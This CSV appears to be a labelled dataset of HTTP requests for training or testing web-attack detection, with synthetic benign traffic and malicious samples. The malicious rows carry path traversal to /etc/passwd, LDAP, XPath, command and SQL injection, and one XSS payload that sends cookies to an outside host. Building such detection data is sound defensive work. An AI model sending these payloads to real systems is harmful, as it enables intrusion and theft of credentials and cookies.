attack_type,difficulty_bucket,difficulty_score,label,raw_request,request_id,request_len,sample_id,source_dataset,source_payload
Path Traversal,medium,,malicious,"POST /download HTTP/1.1
Host: demo.local
User-Agent: python-requests/2.31
Content-Type: application/x-www-form-urlencoded
Content-Length: 54
Connection: close

search=../../../../..//etc/passwd%00index.html&id=2034",,221,patt-path-traversal-1034,PayloadsAllTheThings,../../../../..//etc/passwd%00index.html
LDAP Injection,medium,,malicious,"POST /profile HTTP/1.1
Host: app.local
User-Agent: curl/8.0.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 70
Connection: close

redirect=Can be used in an injection like `*)(ATTRIBUTE_HERE=*&id=1047",,225,patt-ldap-injection-0047,PayloadsAllTheThings,Can be used in an injection like `*)(ATTRIBUTE_HERE=*
XPath Injection,medium,,malicious,"POST /search HTTP/1.1
Host: demo.local
User-Agent: python-requests/2.31
Content-Type: application/x-www-form-urlencoded
Content-Length: 60
Connection: close

q=substring(//user[userid=5]/username,2,1)=CHAR_HERE&id=1386",,225,patt-xpath-injection-0386,PayloadsAllTheThings,"substring(//user[userid=5]/username,2,1)=CHAR_HERE"
Command Injection,medium,,malicious,"POST /comments HTTP/1.1
Host: intranet.local
User-Agent: Mozilla/5.0
Content-Type: application/x-www-form-urlencoded
Content-Length: 26
Connection: close

search=' && whoami&id=1911",,188,patt-command-injection-0911,PayloadsAllTheThings,' && whoami
,hard,-2.0,benign,"POST /lTearhto3w8s/ykZhjniframe/biGYZdncU4tgxOWdNlRg/aG42wCqd5_0Z/replace6K/Zb5AwgetSO-.V/aKzSgx/aRnpRjgC/t-VOcYw7ExWLh/Mthmt8/rnGAWF5TBnDm6Tu69xGj/22i0riMeeanpPavnedc.php3? HTTP/1.1
Content-Length: 264
Content-Language: hcur,ad,sta
Content-Encoding: deflate
Content-Location: http://aCtb.st/hsesTrS/dqsbh/sagxot.sh
Content-MD5: bGtvQ29udTU2VG93Z3J1Yw==
Content-Type: application/x-www-form-urlencoded
Expires: Mon, 31 Jan 05 21:38:29 UTC
Last-Modified: Sun, 29 Oct 06 15:00:32 GMT
Host: www.ngieebR.gov:3
Connection: keep-alive
Accept: video/quicktime;q=0.5, text/*, image/*;q=0.5
Accept-Charset: *;q=0.9
Accept-Encoding: compress;q=0.3, compress, identity, identity
Accept-Language: s-csptpht, u-gaitiqb;q=0.4, etuNn-faec, s5ts-aaei;q=0.8
Cache-Control: max-age=2
Client-ip: 101.34.205.241
Cookie: vgotls96s=gtwlrFPihtoi2r6Tel;dl3g=e>nonyn\nIas
Cookie2: $Version=""749""
Date: Sat, 04 Jul 09 10:21:46 UTC
ETag: W/""s7IUsgMz4KgdDvA6u""
Expect: srrhDnn
From: Towr@gduxvle.gov
If-Modified-Since: Sat, 15 Jan 05 24:43:47 CET
If-Unmodified-Since: Thu, 02 Jul 09 05:08:08 UTC
If-Match: *
If-None-Match: *
If-Range: ""dGEx6CMllplVAU5Dqo6Q""
Max-Forwards: 5
MIME-Version: 5.8
Pragma: tatvesm=h44dmy0
Proxy-Authorization: Basic QVRheXQ4c206RWVkc2VvaA==
Authorization: tloR sre5ih8=cssyot
Range: 90185-
Referer: /efgail4/gehle1/m0oD4rl/eea1zs/ohu6dern.nsf
TE: trailers,trailers,trailers
Trailer: Referer
User-Agent: ereha/9.0.7.4
UA-Disp: 9881,7058,16
UA-OS: Mac OS X
UA-Color: color32
UA-Pixels: 565x3425
Via: HTTP/1.9 www.mtein.jpeg
Transfer-Encoding: gzip
Upgrade: gfr/9.0, vlr/1.0, ty5ayo/3.2
Warning: 021 29.168.107.5:9738 ""vyoao"" ""Fri, 21 May 04 05:27:03 CET""
X-Serial-Number: 06516057
----: ------------------------------------------
~~~~~: ~~~~~~~~~~~~~~~~~~~~~~~~~~

eyneeco=eu0X1kB&wpi=athbs&reAslu9sct=euvAX2Aj8j&fHlibnetcat=mPsl1px&gCpF8bodyftpRDei=)wlthEnap&tkekurehd0n5Rti=(er&le3uroump&OtaPg1ne=46828417&hlkpqb39byC=07&UepWkK@@zi=sxods&txxma=lZuS&lDclnZlalet=ThjeTflibeyMh&ht8ibqusesRoypw=r6&Uoot=tSh&zmaflhycigf1od=319",33519,2070,xml_test-33519,pkdd,
XPath Injection,medium,,malicious,"POST /api/items HTTP/1.1
Host: demo.local
User-Agent: python-requests/2.31
Content-Type: application/x-www-form-urlencoded
Content-Length: 53
Connection: close

redirect=' and count(/comment())=1 and '1'='1&id=1394",,221,patt-xpath-injection-0394,PayloadsAllTheThings,' and count(/comment())=1 and '1'='1
XSS,medium,,malicious,"POST /comments HTTP/1.1
Host: intranet.local
User-Agent: python-requests/2.31
Content-Type: application/x-www-form-urlencoded
Content-Length: 65
Connection: close

path=""`'><script>\xE2\x80\x82javascript:alert(1)</script>&id=2304",,236,patt-xss-1304,PayloadsAllTheThings,"""`'><script>\xE2\x80\x82javascript:alert(1)</script>"
Command Injection,medium,,malicious,"POST /admin/tools HTTP/1.1
Host: intranet.local
User-Agent: curl/8.0.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 18
Connection: close

ip=; id&trace=1018",,0,kaggle-cmdi-018,KaggleWebPayloads,; id
Command Injection,medium,,malicious,"POST /api/items HTTP/1.1
Host: app.local
User-Agent: curl/8.0.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 29
Connection: close

search=eval('whoami')&id=1865",,186,patt-command-injection-0865,PayloadsAllTheThings,eval('whoami')
XSS,medium,4.0,malicious,"PUT /rjA/esNfar/s7AusZ/kQkHa6pp_/svxAMwe/aNvYc2q6EM/5L.exe? HTTP/1.0
Content-Length: 380
Content-Language: nr,olp
Content-Encoding: deflate
Content-Location: /pRtscea/oz8iesze.gz
Content-MD5: ZTNpb2NldEFlTnRmbm9iaQ==
Content-Type: application/x-www-form-urlencoded
Expires: Thu, 12 Jun 08 09:41:20 UTC
Last-Modified: Sun, 31 Jul 05 12:28:43 UTC
Host: www.nsedbKed.biz
Connection: znth0at
Accept: video/quicktime, image/jpeg
Accept-Charset: *
Accept-Encoding: identity;q=0.2, gzip, gzip;q=0.5, identity
Accept-Language: t1ae-or, 1-rlr5st;q=0.8, isr-debhn;q=0.3
Cache-Control: no-store
Client-ip: 180.151.251.196
Cookie: yneuimoj=pp89;clae5headtdr=ati bh5eaxat
Cookie2: $Version=""66""
Date: Fri, 26 Nov 04 09:47:17 GMT
ETag: ""y@tKjzaOGXeONi4MFD""
Expect: 100-continue
From: wdvoio@iotd9eelwd.de
If-Modified-Since: Mon, 07 Aug 06 01:32:47 GMT
If-Unmodified-Since: Wed, 08 Jul 09 08:58:31 GMT
If-Match: ""IivuB7J5hPJGPwFpQvxu""
If-None-Match: *
If-Range: Thu, 09 Nov 06 12:57:01 UTC
Max-Forwards: 4
MIME-Version: 8.3
Pragma: no-cache
Proxy-Authorization: oand kioW=rs9ay
Authorization: NTLM ZXJkRWV0MmJod0Jmcm9pc3JzMUZuMWg1c2VsMm5mZWh4ZWFvdnU=
Range: 175390-78,55-,908690-
Referer: http://7Iotr.gov/ri6H/evtr/sldAeu/Eod2/WoEans.zip
TE: trailers,trailers,trailers
Trailer: Referer
User-Agent: z4Oo654vVb http://www.snij.fr
UA-OS: Windows 98
UA-Color: color8
UA-Pixels: 818x5674
Via: 7.3 www.r7eFut.css:6
Transfer-Encoding: identity
Upgrade: lRoine/6.1
Warning: 793 241.179.195.131 ""halAIevnm"" ""Wed, 27 Apr 05 17:07:05 CET""
X-Forwarded-For: 90.185.191.90
X-Serial-Number: 80684101
----: ---------------------------------
~~~~~: ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

taenskd=er &ns49=05648&rnTeituo=dCCT&no1i5r8=c1qpA&iTgoa6erps=%chh&EdhjafzectN9j=7frerx2li&LL3open-1n2p=1&4musLa1=mnlariy&jsShdgE=av_D&iee=wivntedoe&Nlee=3757868&iraH9hkto=<div    style=  ""    background-image:    url(javascript:   [document.location.replace ('http://www.asndng.com/cgi-bin/rore.cgi'+document.cookie);]);     ""    >",46813,2050,xml_test-46813,pkdd,
Command Injection,medium,,malicious,"POST /api/ping HTTP/1.1
Host: app.local
User-Agent: Mozilla/5.0
Content-Type: application/x-www-form-urlencoded
Content-Length: 29
Connection: close

name=; Get-Service&trace=1038",,0,kaggle-cmdi-038,KaggleWebPayloads,; Get-Service
,hard,-2.0,benign,"POST /o3j8wZvjypTqtO7Y/y8rz88r2nyGyn/EpsW/mdbteEceatrn0yEd3sht/QpUCSvkm4KCcatCG.tiff? HTTP/1.1
Content-Length: 196
Content-Language: Krcmt,yRyeti,zo
Content-Encoding: compress
Content-Location: http://4d7fpa.gov/tdpU/esaw/nlm2Sgit.css
Content-MD5: dHNuMHRycmxnb2ExNGVuZQ==
Content-Type: application/x-www-form-urlencoded
Expires: Mon, 12 Dec 05 20:10:34 CET
Last-Modified: Sun, 26 Mar 06 15:02:11 CET
Host: 193.85.51.22
Connection: keep-alive
Accept: image/jpeg
Accept-Charset: iso-8859-5;q=0.6, iso-8859-15
Accept-Encoding: *
Accept-Language: *
Cache-Control: no-transform
Client-ip: 234.206.164.47
Cookie: sibre6lcfbvu=vu2;2t1GQ2Qb=9137;rsncdOS=xaOEi;sa6sTpehrhio0=r7jR;orTumas=hGr1GVuJX.J9;QeobsdrBewsosj=ic C8
Cookie2: $Version=""89""
Date: Sun, 19 Feb 06 17:48:02 CET
ETag: W/""li4Zf1d-Enhb1U4""
Expect: 100-continue
From: 9acwoadm@8yele.org
If-Modified-Since: Wed, 27 Aug 08 22:17:12 GMT
If-Unmodified-Since: Sat, 14 Nov 09 17:59:37 UTC
If-Match: ""rBlTG4z-c_xNX8Ss""
If-None-Match: *
If-Range: Sun, 17 Oct 04 14:10:31 UTC
Max-Forwards: 254
MIME-Version: 8.2
Pragma: no-cache
Proxy-Authorization: Digest algorithm=MD5
Authorization: Basic aEFpYWhvZTozR3RlZW4=
Range: -64
Referer: http://yahtpq.uk/evt8yt/sysrmin/CEfuelSu/i6oak/ll5o.swf
TE: chunked,deflate
Trailer: Range
User-Agent: Mozilla/6.9 (compatible; aoaeoitxr; Windows NT; eejey2a1i)
UA-CPU: PowerPC
UA-Disp: 743,4010,8
UA-OS: WinNT
UA-Color: color32
UA-Pixels: 6005x647
Via: rxtgs/0.2 30.111.99.167
Transfer-Encoding: gzip
Upgrade: i0taeg/8.4, k4xlia/5.0
Warning: 638 32.100.231.190 ""ronreot0rsachetajte"" 
X-Forwarded-For: 207.213.57.172
X-Serial-Number: 1977553705
----: ---------------------------------
~~~~~: ~~~~~~~~~~~~~~~~~~~~~~~~~~

rsrhreopnmOi=8&0YevWRSjrN=pmldE&thcqneni=8462559565&nippfn4tpnj1iGr=ntzaepT erj&&neOa1d0Nr=6785053&KNvGi=ipsohiOm&4hwto8xaad=hyrt8 n&8nhoe=ynoecpep slyeval%  2am&&dntrorcTonewzo=lkTLTbGcztzE",34617,1942,xml_test-34617,pkdd,
LDAP Injection,medium,5.0,malicious,"POST /pssyWfR/bodyo/QcopyXjM/eacrDavewtglcpsyWca.nsf? HTTP/1.0
Content-Length: 176
Content-Language: oIl,Saib,ola
Content-Encoding: identity
Content-Location: http://www.wrxeeT.uk/teosaWh/cies8nt4/oga4fua.swf
Content-MD5: Y2FydFN0d090TG51SWx1dA==
Content-Type: application/x-www-form-urlencoded
Last-Modified: Wed, 16 Feb 05 16:10:25 UTC
Host: www.arYsi.uk
Connection: keep-alive
Accept: application/*, audio/*, image/jpeg;q=0.1
Accept-Charset: *;q=0.9
Accept-Encoding: *;q=0.7
Accept-Language: WeivtD-7ibrzot;q=0.2, j-s0sSe
Client-ip: 34.254.110.38
Date: Fri, 03 Sep 04 04:32:59 GMT
If-Modified-Since: Sat, 24 Mar 07 19:03:29 CET
If-Range: Wed, 01 Mar 06 13:56:01 GMT
Max-Forwards: 118
Pragma: no-cache
Referer: /aoticii/snor/tOjtoif/tv0i/ytiooo.js
TE: gzip;q=0.4
User-Agent: Mozilla/2.7 (compatible; Konqueror/5.2; Unix; ksroRm02to)
Transfer-Encoding: identity

a7tie0t= &gonwte=ro59oKto492Te&e0ocojocniaiin9=oizr)(&(objectClass= nre*)&mailpkWfr5pW=icaelvHhseos&a2otn=sTnph-a&rgle=1copy~boot.init&ehuarxe5AwtcbMa=Tnenoh~iI",37704,1049,xml_test-37704,pkdd,
Path Traversal,medium,4.0,malicious,"POST /BYiNXVXgBh.pl? HTTP/1.0
Content-Length: 228
Content-Language: eomnm,yomTeao,mnttwpse
Content-Encoding: gzip
Content-Location: /VAtgcc/weyFbr.jsp
Content-MD5: aG15dGFkRWd2ZWluZWNtdA==
Content-Type: application/x-www-form-urlencoded
Expires: Tue, 02 May 06 08:36:09 UTC
Last-Modified: Mon, 10 Aug 09 04:24:06 CET
Host: www.aPeg.com:80
Connection: keep-alive
Accept: audio/basic
Accept-Charset: *;q=0.1
Accept-Encoding: ../../../../../../../../../usr/yo.bat
Accept-Language: n:\\WINNT\\win.ini
Cache-Control: no-transform
Client-ip: 196.9.89.103
Cookie: noin6ohyi2=asTqi;sn=aeesuiwr1nsfo;kpq2=hi;VN4Joptc3U=BiresrdeIwttot;eedO=7319
Date: Mon, 12 Feb 07 12:48:33 UTC
ETag: ""eGwBaRA24wjBRT_nUC""
Expect: 100-continue
From: 5uhy@ih5iar.uk
If-Modified-Since: Sat, 21 Jan 06 23:51:35 GMT
If-Unmodified-Since: Fri, 16 Sep 05 16:35:54 CET
If-Match: ""dFuRUE9IJL_ONJZO71""
If-None-Match: ""hFL-nNxVRpJmwLj2RUva""
If-Range: *
Max-Forwards: 8555
MIME-Version: 2.6
Pragma: aneQa='uvuhrd'
Proxy-Authorization: emiius i5ge=rTmnwt
Authorization: fs3mas yynattw=lroh
Referer: http://www.inpnt.st/oyaoi.swf
TE: trailers,deflate,deflate
Trailer: If-Unmodified-Since
User-Agent: Mozilla/9.1 (Windows; U; Win98 4.2; ym-ft; rv:3.5.4) Gecko/45862145
Via: HTTP/7.4 www.c996A.png, 7.6 www.gfhrc.png, 6.3 www.Ten6.png
Transfer-Encoding: identity
Upgrade: sn8ar/0.2, sdt/9.0
----: -------------------------
~~~~~: ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

tuRatlea9hdna=altylo2replacetqswIn&er9z2ossobarc=;&zgnck1tesi1dt1=tJn.QOj&ti6lqjioepu=7307684&d5rtdqcsrD8ro=gkfAiIGwnFl&anaik=92820000&NwhereOqmcatAYbWd=iZwfACt&dn8wI=s9o9dD@fOgKr&mt=aRMLxVe1lc&eroaohcn=CiPprfm0&cCr3h1IXj=7o",36189,1695,xml_test-36189,pkdd,
SQLi,medium,3.0,malicious,"POST /Eaesa9nifc7qseIe/wIam/ryLqj9sRK/ut/oDuCrR/erWut4/bsduqIpOrrnmogtse1di/select1/iroaDnesrdn/FMG1dP6Y5DZE1/thjLE_Ii7rqUCIB_ArHT.php4? HTTP/1.0
Content-Length: 260
Content-Language: ado,4rs,dTihfsnd
Content-Encoding: compress
Content-Location: http://tceIpN8o.fr/fd0ds/lamdNi/axcaDs9.swf
Content-MD5: ZGdhcWwzdGhlaDdvb3NvUw==
Content-Type: application/x-www-form-urlencoded
Expires: Mon, 28 Jan 08 02:24:20 CET
Last-Modified: Thu, 31 Aug 06 12:53:31 CET
Host: www.uaunuHe.cz
Connection: close
Accept: application/zip;q=0.6, audio/basic;q=0.2
Accept-Charset: koi8-r;q=0.3, euc-tw;q=0.8, windows-1252;q=0.3, x-mac-hebrew;q=0.9, x-mac-greek;q=0.2
Accept-Encoding: *;q=0.2
Accept-Language: e-gnoion;q=0.3, sfhs3ohg-rGoaae;q=0.1, a7tN-eb
Cache-Control: max-age=87
Client-ip: 180.8.150.200
Cookie: rm9djuteoeatt=nAnr3xc;iih65rwyttTy=7ttrr|;ewgr=79873673;utmoimixr6dC6ts=r 3x;gtrSlyg=axvJH;idEa7Ia5dsaek=1830638
Cookie2: $Version=""49""
Date: Sun, 17 Jul 05 21:47:15 CET
ETag: W/""4aBq-mQ1_DiT7vYxf""
Expect: oghl
From: eznB@Adtctleba.uk
If-Modified-Since: Wed, 12 Nov 08 18:53:54 GMT
If-Unmodified-Since: Mon, 27 Dec 04 14:39:41 UTC
If-Match: ""FTba.-n9fS1b70R""
If-None-Match: *
If-Range: Tue, 08 Sep 09 05:55:04 GMT
Max-Forwards: 34
MIME-Version: 2.2
Pragma: la=nkeDl
Proxy-Authorization: Digest opaque=""ia4zuj""
Authorization: NTLM Z3RxbHNpYWhvU2FhZTFubEVuem1SMW5tdHRPb2VFZm9zdHRldXJlZmFFb2x0YWY=
Range: 4509-,62-022408,-4198
Referer: http://www.h7sdtee.cz/eintogea/8rcp/tyehtn/rnup/ggqers.gif
TE: trailers,trailers,gzip
Trailer: Transfer-Encoding
User-Agent: t5I1ac8 http://www.ae3eNmrf.biz
UA-CPU: MIPS
UA-Disp: 016,9117,32
UA-OS: Win9x
UA-Color: color16
UA-Pixels: 738x118
Via: 1.4 www.thuScr.css:9, 9.7 0.189.119.128
Transfer-Encoding: identity
Upgrade: rht/5.4
Warning: 149 193.52.96.248 ""8Xhauustfrrwxeheore"" 
X-Forwarded-For: 172.76.114.81
X-Serial-Number: 19164
----: ---------------------------------------
~~~~~: ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

vkDdngogths6uT=2652838&ss=ohhroinputee$&to&itNe20=6rhtpass&r0midruesi=2eawiUUPEnI&gealtEe=ees;phttpsytoEeel e&egnW=qwer'  or Be2a0_v.Account='iunsila@meS.com&cdpmEonvQ=6805&81veip34qTAwe=tf&29Yw=oa|&mpM_passwd=psnsihsercprmj&tro=T>0ao node(",41417,2244,xml_test-41417,pkdd,
